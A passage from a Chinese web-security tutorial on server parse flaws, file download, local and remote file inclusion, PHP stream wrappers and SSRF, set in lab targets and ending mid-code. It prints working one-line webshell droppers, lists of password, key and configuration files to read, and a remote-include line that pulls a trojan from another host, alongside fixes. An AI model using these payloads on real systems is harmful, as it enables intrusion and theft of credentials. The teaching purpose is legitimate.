<p>&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php @eval($_POST[x])?&gt;’)?&gt;</p>
<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件 shell.php 。</p>
<p>临时解决办法：设置 cgi.fix_pathinfo为0</p>
<h4 id="IIS7-5漏洞解析"><a href="#IIS7-5漏洞解析" class="headerlink" title="IIS7.5漏洞解析"></a>IIS7.5漏洞解析</h4><p>版本IIS7.5</p>
<p>漏洞产生原因： php.ini里默认cgi.fix_pathinfo&#x3D;1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析</p>
<p>满足条件：</p>
<p>​	1、php.ini里默认cgi.fix_pathinfo&#x3D;1开启</p>
<p>​	2、设置FastCGI为关闭</p>
<p>漏洞利用方式：</p>
<p>​	将含有木马的正常文件后缀的文件进行上传，然后使用</p>
<p><a target="_blank" rel="noopener" href="https://www.xp.cn/a.txt/.php">https://www.xp.cn/a.txt/.php</a></p>
<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>漏洞原理</p>
<p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把oldboy.php.owf.rar解析成php。</p>
<p>漏洞形式</p>
<p><a target="_blank" rel="noopener" href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a></p>
<p>其余配置问题导致漏洞</p>
<p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<p>修复方法：</p>
<p>​	1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p>
<p>​	&lt;Files ~ “.(php.|php3.)”&gt;</p>
<p>​    	Order Allow,Deny</p>
<p>​    	Deny from all</p>
<p>​	&lt;&#x2F;Files&gt;</p>
<p>​	2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules&#x2F;mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</p>
<p>​	<IfModule mod_rewrite.c></p>
<p>​	RewriteEngine On</p>
<p>​	RewriteRule .(php.|php3.) &#x2F;index.php</p>
<p>​	RewriteRule .(pHp.|pHp3.) &#x2F;index.php</p>
<p>​	RewriteRule .(phP.|phP3.) &#x2F;index.php</p>
<p>​	RewriteRule .(Php.|Php3.) &#x2F;index.php</p>
<p>​	RewriteRule .(PHp.|PHp3.) &#x2F;index.php</p>
<p>​	RewriteRule .(PhP.|PhP3.) &#x2F;index.php</p>
<p>​	RewriteRule .(pHP.|pHP3.) &#x2F;index.php</p>
<p>​	RewriteRule .(PHP.|PHP3.) &#x2F;index.php</p>
<p>​	&lt;&#x2F;IfModule&gt;</p>
<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><p>漏洞原理</p>
<p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA%E2%80%9Cphpinfo.jpg/1.php%E2%80%9D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%9E%84%E9%80%A0%E6%88%90SCRIPT_FILENAME%E4%BC%A0%E9%80%92%E7%BB%99PHP">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>漏洞形式</p>
<p><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg/%00.php">www.xxxx.com/UploadFiles/image/1.jpg\%00.php</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/UploadFiles/image/1.jpg//%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/\%20\0.php</a></p>
<p>xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</p>
<p>&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;‘);?&gt;</p>
<p>然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</p>
<p>修复方案</p>
<p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：</p>
<p>if ( $fastcgi_script_name ~ ..*&#x2F;.*php ) {</p>
<p>return 403;</p>
<p>}</p>
<p>这行代码的意思是当匹配到类似test.jpg&#x2F;a.php的URL时，将返回403错误代码。</p>
<h2 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，<br>则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>一般链接形式:<br>download.php?path&#x3D;<br>down.php?file&#x3D;<br>data.php?file&#x3D;<br>download.php?filename&#x3D;</p>
<p>或者包含参数:<br>&amp;Src&#x3D;<br>&amp;Inputfile&#x3D;<br>&amp;Filepath&#x3D;<br>&amp;Path&#x3D;<br>&amp;Data&#x3D;</p>
<p>靶场环境应用<br><a target="_blank" rel="noopener" href="http://10.0.0.101:90/pikachu/vul/unsafedownload/down_nba.php">http://10.0.0.101:90/pikachu/vul/unsafedownload/down_nba.php</a><br>下载文件链接：<br><a target="_blank" rel="noopener" href="http://10.0.0.101:90/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.0.0.101:90/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</a></p>
<p>当遇到一个任意文件下载时，我们的一般利用思路:</p>
<p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p>
<p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p>
<p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>   尝试读取&#x2F;root&#x2F;.bash_history看自己是否具有root权限。<br>   如果没有的话。我们只能按部就班的利用..&#x2F;来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。<br>   来查看是否记录了一些可以利用的相关信息。<br>   然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p>
<p>如果我们遇到的是java+oracle环境<br>可以先下载&#x2F;WEB-INF&#x2F;classes&#x2F;applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载&#x2F;WEB-INF&#x2F;classes&#x2F;xxx&#x2F;xxx&#x2F;ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p>
<p>如果具有root权限<br>在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db。<br>这个数据库中含有本地所有文件信息。<br>Linux系统自动创建这个数据库，并且每天自动更新一次。<br>当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。</p>
<p>locate 读取方法: locate mlocate.db admin<br>&#x2F;&#x2F;可以将mlocate.db中包含admin文件名的内容全部输出来</p>
<p>（4）常见利用文件<br>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;root&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore<br>&#x2F;root&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;记录每个访问计算机用户的公钥<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow<br>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql配置文件<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache配置文件<br>&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;用户历史命令记录文件<br>&#x2F;root&#x2F;.mysql_history &#x2F;&#x2F;mysql历史命令记录文件<br>&#x2F;proc&#x2F;mounts &#x2F;&#x2F;记录系统挂载设备<br>&#x2F;porc&#x2F;config.gz &#x2F;&#x2F;内核配置文件<br>&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db &#x2F;&#x2F;全文件路径<br>&#x2F;porc&#x2F;self&#x2F;cmdline &#x2F;&#x2F;当前进程的cmdline参数</p>
<h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h3><p>（1）过滤”.”，使用户在url中不能回溯上级目录</p>
<p>（2）正则严格判断用户输入参数的格式</p>
<p>（3）php.ini配置open_basedir限定文件访问范围</p>
<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><p>文件包含原理：</p>
<p>​	程序员在开发的时候，未对包含的文件进行严格过滤，攻击者可以构造图片木马文件当作php执行</p>
<p>漏洞产生原因：</p>
<p>​	在使用include()等函数时，未对包含的文件进行过滤。include()函数会将任意文件的类型，进行PHP代码解析</p>
<p>包含漏洞分类</p>
<ul>
<li>本地包含</li>
<li>远程包含<ul>
<li>远程包含需要开启allow_url_include&#x3D;on 、magic_quotes_gpc&#x3D;off</li>
</ul>
</li>
</ul>
<p>如何快速挖掘文件包含漏洞</p>
<p>​	直接查找源代码里的4个函数</p>
<p>​	include(),include_once(),require(),require_once()</p>
<p>这2个函数include(),include_once()不重复加载，require()和require_once()遇到错误退出</p>
<h2 id="本地包含漏洞LFI"><a href="#本地包含漏洞LFI" class="headerlink" title="本地包含漏洞LFI"></a>本地包含漏洞LFI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>可以通过本地文件包含漏洞打开本地文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">file=\<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">	include($</span><span class="language-bash">file);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>利用此漏洞可以读取一些系统本地的敏感信息。</p>
<p>(1)使用绝对路径</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?filename=C:%5Cwindows%5Csystem.ini">http://127.0.0.1/include.php?filename=C:\windows\system.ini</a></p>
<p>(2)使用相对路径进行读取</p>
<p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?filename=../../phpinfo.jpg">http://127.0.0.1/include.php?filename=../../phpinfo.jpg</a></p>
<p>常用敏感信息路径：</p>
<p>windows：</p>
<p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件<br>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码<br>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置<br>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码<br>C:\windows\php.ini &#x2F;&#x2F;php配置信息</p>
<p>Linux：</p>
<p>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</p>
<h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><h4 id="配合文件进行上传"><a href="#配合文件进行上传" class="headerlink" title="配合文件进行上传"></a>配合文件进行上传</h4><p>无法找到文件上传漏洞上传webshell时，可以先通过上传一个图片格式的webshell到web服务器，在利用本地文件包含漏洞进行解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
<h4 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h4><p>当Apache开启相关日志功能(\logs\access.log)后，通常可以访问URL携带一句话木马，从而写入日志文件中</p>
<p>利用条件：</p>
<p>​	对文件日志可读</p>
<p>​	知道日志文件存储目录</p>
<p>注意：一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf…..)或者根据phpinfo()带来的信息来得知</p>
<p>1、通常情况下，在地址栏构造  <a target="_blank" rel="noopener" href="http://192.168.1.55:8080/dvwa/1.php">http://192.168.1.55:8080/dvwa/1.php</a> &lt;?php @eval($_POST[‘hack’]);?&gt;	发现日志记录中会将该URL进行编码，无法实现进行连接</p>
<p>2、需要通过burp抓包，重新构造请求行，进行发送</p>
<p>3、上传之后使用webshell管理工具进行连接。</p>
<h2 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">path=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">	include($</span><span class="language-bash">path . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以观察到该页面并没有对$path做任何过滤，因此存在文件包含漏洞。</p>
<p>我们在远端Web服务器&#x2F;site&#x2F;目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。</p>
<p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p>
<p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：<br><img src="/img/oldboy/2ca64d46dc74254f30699d6a5b43fd01.png" alt="在这里插入图片描述"></p>
<p>如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限。</p>
<blockquote>
<p>可以通过在本地搭建图片马，然后操控靶机开启allow_url_include、allow_url_fopen参数，通过文件包含漏洞控制访问本机的图片马(例如：<a target="_blank" rel="noopener" href="http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg">http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg</a>)</p>
<p>再通过蚁剑添加<a target="_blank" rel="noopener" href="http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg%E4%BB%8E%E8%80%8C%E6%8E%A7%E5%88%B6%E9%9D%B6%E6%9C%BA">http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg从而控制靶机</a></p>
</blockquote>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><img src="/img/oldboy/image-20250306163301204.png" alt="image-20250306163301204"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/cdf1dfdb5bf058cc3c07823f2c9a0cc8.png" alt="在这里插入图片描述"></p>
<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9804c2536776aebd3e8f87d6e6ba3170.png" alt="在这里插入图片描述"></p>
<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code><br><strong>php:&#x2F;&#x2F;filter用于读取源码</strong>。<br><strong>php:&#x2F;&#x2F;input用于执行php代码</strong>。</p>
<p><strong>php:&#x2F;&#x2F;filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<p><strong>利用条件:</strong>	</p>
<ul>
<li>allow_url_fopen ：off&#x2F;on</li>
<li>allow_url_include：off&#x2F;on</li>
</ul>
<p>有特殊字符一定要转化为base64，例如：<a target="_blank" rel="noopener" href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p>
<p>再进行base64解码，获取到2.php的完整源码信息</p>
<p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
<p><strong>利用条件:</strong></p>
<ul>
<li>allow_url_fopen ：off&#x2F;on</li>
<li>allow_url_include：on</li>
</ul>
<p>利用该方法，我们可以直接写入php文件，输入<code>file=php://input</code>，然后使用burp抓包，写入php代码：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/77e3a356bb8653fe01cb7f79f577c36a.png" alt="在这里插入图片描述"></p>
<p>发送报文，可以看到本地生成了一句话木马：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0fccd0cb7c16e9308cd76529b316a3b2.png" alt="在这里插入图片描述"></p>
<h3 id="ZIP-协议"><a href="#ZIP-协议" class="headerlink" title="ZIP:&#x2F;&#x2F;协议"></a>ZIP:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
<p>​	zip:&#x2F;&#x2F;中只能传入绝对路径。<br>​	要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）<br>​	只需要是zip的压缩包即可，后缀名可以任意更改。<br>​	相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;</p>
<p><strong>利用条件:</strong></p>
<ul>
<li>allow_url_fopen ：off&#x2F;on</li>
<li>allow_url_include：off&#x2F;on</li>
</ul>
<p>POC为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip\%23phpinfo.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://i-blog.csdnimg.cn/blog_migrate/012f3ceb1aa9bc1dc885d1ddf13d3212.png" alt="在这里插入图片描述"></p>
<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p>data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
<p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br>利用条件:</p>
<p>allow_url_fopen ：on<br>allow_url_include：on</p>
<p>POC为:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/f40ca9293fc6372eb5961de2438b36e8.png" alt="在这里插入图片描述"></p>
<h2 id="文件包含漏洞防护"><a href="#文件包含漏洞防护" class="headerlink" title="文件包含漏洞防护"></a>文件包含漏洞防护</h2><p>1、使用str_replace等方法过滤掉危险字符</p>
<p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
<p>3、php版本升级，防止%00截断</p>
<p>4、对上传的文件进行重命名，防止被读取</p>
<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
<p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</p>
<h1 id="SSRF跨站伪造请求"><a href="#SSRF跨站伪造请求" class="headerlink" title="SSRF跨站伪造请求"></a>SSRF跨站伪造请求</h1><h2 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h3><p>SSRF服务器端跨站伪造请求，是一种攻击者构造由服务器端请求发起的一个安全漏洞。</p>
<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>攻击原理</p>
<p>攻击者控制内网的一台服务器进而攻击再同一内网的其他服务器</p>
<h3 id="SSRF产生原因"><a href="#SSRF产生原因" class="headerlink" title="SSRF产生原因"></a>SSRF产生原因</h3><p>服务器端的验证并没有对其请求获取图片的参数(image&#x3D;)做出严格的过滤以及限制，导致内网服务器可以获取内网其他服务器的数据。</p>
<p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p>
<h2 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容	</p>
<p>​	例如：<a target="_blank" rel="noopener" href="http://test.com/share.do?link=http://www.baidu.com">http://test.com/share.do?link=http://www.baidu.com</a></p>
<p>2、转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。</p>
<p>3、在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure>



<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
<p>6、图片加载与下载；通过url地址加载与下载图片</p>
<p>通过URL关键字中寻找</p>
<blockquote>
<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
</blockquote>
<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p>产生SSRF的函数主要是：</p>
<ol>
<li>file_get_contents()</li>
<li>sockopen()</li>
<li>curl_exec()</li>
</ol>
<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">content = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filename =<span class="string">&#x27;/img/oldboy/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>;</span> </span><br><span class="line"><span class="meta prompt_">file_put_contents($</span><span class="language-bash">filename, <span class="variable">$content</span>);</span> </span><br><span class="line">echo $_POST[&#x27;url&#x27;]; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">img = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span> </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h3 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a><strong>sockopen()</strong></h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">fp = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span> </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta 